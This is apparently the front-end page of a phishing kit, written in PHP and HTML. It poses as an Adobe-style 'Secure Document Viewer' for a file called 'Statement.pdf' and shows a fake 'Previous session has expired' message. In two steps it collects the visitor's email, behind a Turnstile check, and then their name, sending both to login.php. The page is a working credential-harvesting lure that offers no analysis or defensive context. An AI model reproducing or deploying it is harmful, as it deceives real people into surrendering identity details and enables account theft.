<?php
session_start();

// Step control
$step = $_SESSION['step'] ?? 1;

// Old email
$old_email = $_SESSION['old_email'] ?? '';
$error     = $_SESSION['error_message'] ?? '';
unset($_SESSION['error_message']);

$hasError = !empty($error);

// Hide "session expired" if this specific error is shown
$hideSessionMsg = ($error === 'Incorrect name entered.');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Document Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Cloudflare Turnstile -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

    <style>
        /* Global box-sizing */
        *, *::before, *::after {
            box-sizing: border-box;
        }

        /* -------------------------------------------
           Adobe-like theme tokens
        -------------------------------------------- */
        :root {
            --card-bg: #ffffff;
            --text-color: #222222;
            --subtext: #6b6b6b;
            --border: #d4d4d4;
            --btn-bg: #1473e6;      /* Adobe-ish blue */
            --btn-hover: #0f5cc0;
            --error: #c9252d;
            --overlay-dark: rgba(0,0,0,0.65);
            --readonly-bg: #e3e5eb;
            --divider: #e8e8e8;
            --font-xs: 11px;
            --font-sm: 12px;
            --font-btn: 12px;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --card-bg: #1e1e1f;
                --text-color: #f3f3f3;
                --subtext: #a0a0a0;
                --border: #333;
                --btn-bg: #4a8fff;
                --btn-hover: #3a73d0;
                --readonly-bg: #2a2d35;
                --divider: #2c2c2c;
            }
        }

        /* -------------------------------------------
           PAGE BACKGROUND
        -------------------------------------------- */
        body {
            margin: 0;
            font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
            background: #111;
            color: var(--text-color);
            min-height: 100vh;
        }

        .page-wrapper {
            position: relative;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .doc-background {
            position: absolute;
            inset: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            filter: blur(6px);
            transform: scale(1.04);
            opacity: 0.7;
        }

        .doc-background img {
            max-width: 100%;
            max-height: 100vh;
            object-fit: contain;
        }

        .page-wrapper::before {
            content: "";
            position: absolute;
            inset: 0;
            background: var(--overlay-dark);
            pointer-events: none;
        }

        /* -------------------------------------------
           CARD – Adobe-style, compact
        -------------------------------------------- */
        .login-card {
            position: relative;
            z-index: 2;
            width: 95%;
            max-width: 320px;
            background: var(--card-bg);
            border-radius: 4px;
            padding: 18px 20px 22px;
            border: 1px solid #d0d0d0;
            box-shadow: 0 10px 24px rgba(0,0,0,0.28);
            overflow: hidden;

            opacity: 0;
            transform: translateY(14px) scale(0.985);
            animation: cardIn 0.5s ease-out forwards;
        }

        .login-card.has-error {
            border-color: rgba(201, 37, 45, 0.55);
        }

        @keyframes cardIn {
            from {
                opacity: 0;
                transform: translateY(18px) scale(0.97);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .top-divider {
            width: 100%;
            height: 1px;
            background: var(--divider);
            margin: 8px 0 12px;
        }

        /* Icon & title zone */
        .doc-icon {
            width: 38px;
            height: 38px;
            margin: 0 auto 6px;
        }
        .doc-icon-img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .doc-title {
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 2px;
        }
        .doc-size {
            font-weight: 400;
            color: var(--subtext);
            font-size: var(--font-xs);
        }

        .doc-subtitle {
            text-align: center;
            color: var(--error);
            font-size: var(--font-xs);
            margin-bottom: 8px;
            font-weight: 600;
        }

        .login-error {
            color: var(--error);
            font-size: var(--font-xs);
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }

        /* -------------------------------------------
           FORM ELEMENTS
        -------------------------------------------- */
        .field-wrapper {
            margin-bottom: 9px;
        }

        .field-wrapper input {
            width: 100%;
            padding: 8px 9px;
            border-radius: 3px;
            border: 1px solid var(--border);
            background: #fafafa;
            color: var(--text-color);
            font-size: var(--font-sm);
            outline: none;
        }

        .field-wrapper input:focus {
            border-color: var(--btn-bg);
            box-shadow: 0 0 0 1px rgba(20,115,230,0.18);
            background: #ffffff;
        }

        /* Darker, locked email field after validation */
        .readonly-input {
            background: var(--readonly-bg);
            color: var(--subtext);
            cursor: not-allowed;
        }

        /* CAPTCHA */
        .captcha-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 6px 0 4px;
        }

        .cf-turnstile {
            transform: scale(0.88);
            transform-origin: center center;
        }

        /* Button – Adobe blue style */
        .btn-primary {
            width: 100%;
            padding: 9px 10px;
            background: var(--btn-bg);
            color: #ffffff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: var(--font-btn);
            margin-top: 4px;
            font-weight: 600;
        }

        .btn-primary:hover {
            background: var(--btn-hover);
        }
    </style>
</head>
<body>
<div class="page-wrapper">

    <div class="doc-background">
        <img src="assets/background.png" alt="Document preview">
    </div>

    <div class="login-card<?= $hasError ? ' has-error' : '' ?>">

        <div class="doc-icon">
            <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
        </div>

        <h2 class="doc-title">
            Statement.pdf <span class="doc-size">(197 KB)</span>
        </h2>

        <?php if (!$hideSessionMsg): ?>
            <!-- Session message: shown on step 1 & 2 EXCEPT when error is "Incorrect name entered." -->
            <p class="doc-subtitle">Previous session has expired, login to continue.</p>
        <?php endif; ?>

        <div class="top-divider"></div>

        <?php if ($error): ?>
            <p class="login-error"><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>

        <?php if ($step == 1): ?>
            <!-- STEP 1 — EMAIL + CAPTCHA -->
            <form method="POST" action="login.php">
                <div class="field-wrapper">
                    <input
                        type="email"
                        name="email"
                        placeholder="Enter your email"
                        value="<?= htmlspecialchars($old_email) ?>"
                        required
                    >
                </div>

                <div class="captcha-wrapper">
                    <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
                </div>

                <button class="btn-primary">Next</button>
            </form>

        <?php else: ?>
            <!-- STEP 2 — LOCKED EMAIL + NAME -->
            <form method="POST" action="login.php">
                <div class="field-wrapper">
                    <input
                        type="email"
                        value="<?= htmlspecialchars($old_email) ?>"
                        class="readonly-input"
                        readonly
                    >
                </div>

                <div class="field-wrapper">
                    <input
                        type="text"
                        name="name"
                        placeholder="Enter your name"
                        required
                    >
                </div>

                <button class="btn-primary">Next</button>
            </form>
        <?php endif; ?>
    </div>
</div>
</body>
</html>
